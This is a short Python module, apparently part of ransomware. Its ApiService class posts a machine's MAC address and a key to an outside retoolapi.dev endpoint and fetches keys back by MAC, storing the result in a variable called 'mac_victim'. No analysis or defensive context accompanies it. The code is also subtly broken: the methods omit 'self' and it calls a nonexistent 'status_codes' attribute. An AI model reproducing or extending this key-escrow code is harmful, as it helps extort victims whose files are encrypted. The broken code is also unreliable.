import requests
import json

class ApiService:
  def __init__(self) -> None:
    pass

  def get_key(mac_add):
    headers = {"Accept": "application/json"}
    url = 'https://retoolapi.dev/nYHSqM/data?mac=' + mac_add
    respone = requests.get(url=url, headers=headers)
    json_respone = json.loads(respone.text)
    try:
      mac_victim = json_respone[0]['key']
    except:
      mac_victim = 'NA'
    return mac_victim

  def post_key(mac_add, key) -> int:
    headers = {"Accept": "application/json"}
    url = 'https://retoolapi.dev/nYHSqM/data' 
    data = {'mac': mac_add, 'key': key}
    respone = requests.post(url=url, headers=headers, data=data)
    return respone.status_codes